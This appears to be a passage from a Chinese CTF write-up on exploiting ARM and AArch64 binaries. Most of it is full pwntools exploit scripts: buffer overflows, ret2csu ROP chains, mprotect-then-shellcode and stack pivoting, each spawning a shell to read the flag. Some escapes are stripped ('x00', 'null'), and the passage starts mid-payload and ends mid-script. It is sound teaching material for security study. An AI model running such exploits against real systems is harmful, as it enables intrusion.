    payload += p64(0x4008AC)                 # X30
    payload += p64(0) + p64(1)               # X19 , X20
    payload += p64(0x411068 + 0x100)         # X21
    payload += p64(0x7)                      # X22
    payload += p64(0x1000)                   # X23
    payload += p64(0x411000)                 # X24
    payload += p64(0xdeadbeef)               # X29
    payload += p64(0x400068)                 # X30
    payload += p64(0) * 0x6                  # X19 - X24
####  Final exploit
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='aarch64'
    Debug = False
    shanghai2018_baby_arm=ELF('./shanghai2018_baby_arm', checksec = False)
    libc=ELF("/usr/aarch64-linux-gnu/lib/libc.so.6", checksec = False)
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./", checksec = False)
            return remote(sys.argv[1], sys.argv[2])
        elif Debug:
            sh = process(["qemu-aarch64", "-g", "2333", "-L", "/usr/aarch64-linux-gnu", "./shanghai2018_baby_arm"])
            log.info('Please use GDB remote!(Enter to continue)')
            raw_input()
            return sh
        else :
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "./shanghai2018_baby_arm"])
    def get_address(sh,arch_num=null,info=null,start_string=null,end_string=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif arch_num == 64:
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        log.success(info+str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    if __name__ == "__main__":
        sh = get_sh()
        shell_code = asm(shellcraft.sh())
        shell_code = shell_code.ljust(0x100,'x90')
        shell_code = shell_code + p64(shanghai2018_baby_arm.plt['mprotect'])
        padding  = 'A' * 0x40 + p64(0xdeadbeef)
        payload  = padding + p64(0x4008CC)       # X19 , X20
        payload += p64(0xdeadbeef)               # X29
        payload += p64(0x4008AC)                 # X30
        payload += p64(0) + p64(1)               # X19 , X20
        payload += p64(0x411068 + 0x100)         # X21
        payload += p64(0x7)                      # X22
        payload += p64(0x1000)                   # X23
        payload += p64(0x411000)                 # X24
        payload += p64(0xdeadbeef)               # X29
        payload += p64(0x411068)                 # X30
        payload += p64(0) * 0x6                  # X19 - X24
        sh.recvuntil('Name:')
        sh.sendline(shell_code)
        sh.sendline(payload)
        sh.interactive()
        flag=get_flag(sh)
        log.success('The flag is '+flag)
###  以inctf2018-warmup为例
####  程序分析
程序为ARM-32-dynamically linked程序。
明显存在栈溢出漏洞。
但是这次我们只能溢出0x10个字节，并且程序中看似没有什么好用的gadget。
注意到程序中存在一个可以控制R3的gadget，并且可以利用main函数中的汇编语句完成任意地址写。
那么我们可以向BSS段写入shellcode并执行。
####  Final Exploit
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='arm'
    Deb =False
    wARMup=ELF('./wARMup', checksec = False)
    libc=ELF("/usr/arm-linux-gnueabi/lib/libc.so.6", checksec = False)
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./", checksec = False)
            return remote(sys.argv[1], sys.argv[2])
        elif Deb:
            sh = process(["qemu-arm", "-g", "2333", "-L", "/usr/arm-linux-gnueabihf", "./wARMup"])
            log.info('Please use GDB remote!(Enter to continue)')
            raw_input()
            return sh
        else :
            return process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./wARMup"])
    def get_address(sh,arch_num=null,info=null,start_string=null,end_string=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif arch_num == 64:
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        log.success(info+str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    if __name__ == "__main__":
        shellcode = asm(shellcraft.sh())
        sh = get_sh()
        payload  = 'A' * 0x64 + p32(wARMup.bss() + 0x300) + p32(0x0010364) + p32(wARMup.bss() + 0x300) + p32(0x0010530)
        sh.recvuntil('Welcome to bi0s CTF!')
        sh.sendline(payload)
        sh.sendline(p32(wARMup.bss() + 0x304) + shellcode)
        sh.interactive()
        flag=get_flag(sh)
        log.success('The flag is '+flag)
###  以Stack_buffer_overflow_basic为例
####  程序分析
程序为ARM-32-dynamically linked程序。
使用IDA分析发现程序逻辑并不是十分明了的。
但是试运行后发现程序逻辑较为明确，可以发现我们可以向栈上写入数据，且数据的起始地址程序会告诉我们，于是可以很明确的构造ret2shellcode。
####  Final Exploit
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='arm'
    Stack_buffer_overflow_basic=ELF('./Stack_buffer_overflow_basic', checksec = False)
    libc=ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6", checksec = False)
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./", checksec = False)
            return remote(sys.argv[1], sys.argv[2])
        elif False:
            sh = process(["qemu-arm", "-g", "2333", "-L", "/usr/arm-linux-gnueabihf", "./Stack_buffer_overflow_basic"])
            log.info('Please use GDB remote!(Enter to continue)')
            raw_input()
            return sh
        else :
            return process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./Stack_buffer_overflow_basic"])
    def get_address(sh,arch_num=null,info=null,start_string=null,end_string=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif arch_num == 64:
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        log.success(info+str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    if __name__ == "__main__":
        sh = get_sh()
        sh.recvuntil('Give me data to dump:')
        sh.sendline('A')
        shellcode_addr = get_address(sh,32,'We get shellcode address is ','0x',':',True)
        shellcode = asm(shellcraft.sh())
        payload = shellcode.ljust(0xA4,'x90') + p32(shellcode_addr)
        sh.recvuntil('Dump again (y/n):')
        sh.sendline('y')
        sh.recvuntil('Give me data to dump:')
        sh.sendline(payload)
        sh.recvuntil('Dump again (y/n):')
        sh.sendline('n')
        sh.interactive()
        flag=get_flag(sh)
        log.success('The flag is '+flag)
###  以Basic_ROP为例 —— 栈迁移实例
####  程序分析
程序为ARM-32-dynamically linked程序。
此处明显存在栈溢出，因为a1的值没有限定长度，但是程序中没有合适的gadget可供利用，因此还是利用ret2csu来进行利用。
首先通过调试可以确定劫持返回地址的位置。(`payload = 'x41' * 0x44 + 'BBBB'`)
padding确定之后就开始寻找程序中可能存在的gadget
发现只有控制R3的较为方便的指针，接下来发现main函数中可以利用R3寄存器间接控制R1寄存器实现任意地址写，以及间接控制R0寄存器。
那么我们的思路就是利用 **栈迁移** ，将栈迁移到BSS段实现利用。
####  Final Exploit
    from pwn import *
    import sys